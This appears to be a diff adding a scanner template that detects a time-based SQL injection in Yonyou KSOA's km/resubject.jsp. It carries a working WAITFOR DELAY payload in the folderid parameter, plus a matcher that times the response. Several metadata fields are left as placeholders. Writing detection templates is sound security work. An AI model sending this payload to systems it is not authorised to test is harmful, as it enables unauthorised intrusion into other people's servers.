@@ -1,0 +1,33 @@
+id: yonyou-ksoa-resubject-sqli
+info:
+  name: 用友-时空KSOA resubject-sql 注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/nE0HwOQh8FjRPMDBfwR-Lw
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,ksoa
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET km/resubject.jsp?folderid=';WAITFOR%20DELAY%20'0:0:5'--%20 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - contains_all(body,'')
+          # - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
